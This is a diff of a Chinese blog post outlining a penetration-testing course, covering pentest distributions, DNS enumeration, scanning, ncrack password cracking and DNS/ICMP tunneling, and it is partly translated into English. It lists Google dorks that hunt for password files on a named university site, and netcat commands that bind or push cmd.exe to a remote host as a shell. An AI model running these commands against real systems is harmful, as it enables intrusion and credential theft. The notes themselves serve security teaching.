@@ -12,13 +12,13 @@ tags:
 - 安全
 ---
 
-第一份工作进入尾声了，准备最后一段课程的视频的录制，课程的设计的思路是：借助一下主流的工具，来介绍一下常见的网络安全的比较感性的原理（对细微本身讲的较少）。大体课程内容设计如下：
+The first course will end with a video，准备最后一段课程的视频的录制，课程的设计的思路是：借助一下主流的工具，来介绍一下常见的网络安全的比较感性的原理（对细微本身讲的较少）。大体课程内容设计如下：
 
 
 ### Linux安全测试发行版介绍：
 
 
-BackTrack:(虽然现在项目已经换名字了，但是依然有很多人喜欢bt)
+BackTrack:(Although the project was update to kali, many people also like using BT)
 Probably the most widely known pen-test distro out there and one of the oldest distro still being actively developed. There is a thumb-drive and Live DVD version, plus the ability to do a full install in your hard-drive. The distribution is based on Ubuntu with custom packages that gets updated on a regular basis.
 
 kali：
@@ -37,19 +37,16 @@ Pentoo: A livecd based on Gentoo and XFCE. Also available as an overlay for exis
 
 传统的本地dns探测工具，多数依赖于字典文件：
 
-
     dnsenum.pl -f dns_list.txt --dnserver 8.8.8.8 cisco.com -o cisco.list
 
     dnsmap cisco.com -w wordlist.txt -c cisco.csv
-
 
 路由信息收集工具，一个传统的udp实现，一个现代一点的利用tcp实现，可以穿越防火墙。
 paratrace,一种新的、隐形的 traceroute,可使用有状态的过滤器。
 traceroute:传统的工具
 tcptraceroute ：稍微新一点，利用tcp的工具。
 
-搜索引擎的技巧
-http://en.wikipedia.org/wiki/Google_hacking
+搜索引擎的技巧 http://en.wikipedia.org/wiki/Google_hacking
 filetype:xls site:jlxy.nju.edu.cn
 密码 site:jlxy.nju.edu.cn
 密码 site:jlxy.nju.edu.cn filetype:doc
@@ -66,22 +63,17 @@ site:jlxy.nju.edu.cn intext:admin
 
 ### 扫描技术
 
-
 发现主机
-
-
     arping -c 2 192.168.1.1
 
     fping -s -r 1 192.168.1.1 192.168.1.254
 
     hping3 -c 2 192.168.1.1
 
-
     #hping3
     hping>hping send {ip(addr=192.168.1.1)+icmp(type=8,code=0)}
 
     nbtscan 192.168.1.1-254
-
 
 操作系统指纹识别
 
@@ -98,10 +90,8 @@ scanrand:一个非常快速、无状态的 TCP 端口扫描器和 traceroute 工
 
 服务探测
 
-
     cd /pentest/enumeration/www/httprint/linux/
     httprint -h 192.168.1.1 -s singnature.txt
-
 
 VPN探测
 
@@ -195,33 +185,27 @@ dsniff 包由 Dug Song 编写,已经发布几年了,是一组强大的网络审�
 ### 密码破解
 
 
-在线的：以破解cisco的路由器，和html表单的例子。
+####在线的：以破解cisco的路由器，和html表单的例子。
 ncrack -U pass -v -P pass telnet://192.168.1.1
 ncrack -U pass -v -P pass http://192.168.1.1
-Web 表单
-离线的：无线的密码破解是离线的
+
+####Web 表单
+
+####离线的：无线的密码破解是离线的
 
 
 ### 维持访问
-
-
 基本都是两台主机，其中一台替另一台通过某些服务对流量进行封装中继。
 
-Dns 隧道
+####Dns 隧道
 Server:dns2tcpd
-
-
     ./dns2tcpd -F -d 1 -f dns2tcpd.conf
 
-
 Client:
-
-
     ./dns2tcpc  -z  domain.org
 
 
 配置文件：
-
 
     Domain=domain.org
     Rescoure = ssh
@@ -229,34 +213,25 @@ Client:
     Debug = 1
 
 
-icmp 隧道
+####icmp 隧道
 Server:
-
     ./ptunnel
 
-
 Client:
-
-
     ./ptunnel -p tun.ser_ip -lp 2222 -da ture.ip  -dp 22
 
-
-代理服务器
+####代理服务器
 netcat
 Windows:
-
     nc.exe -d -L -p 1234 -e cmd.exe
 
 Remote:
-
     nc -l -p 1234
 
 locale:
-
     nc -d remore port -e cmd.exe
 
 Nc realy:（利用脚本实现），就是一种重定向，指定的数据流转发，还可以把传输的信息dump一次。
-
 
     #/bin/bash
     nc -o output.file ip_addr port
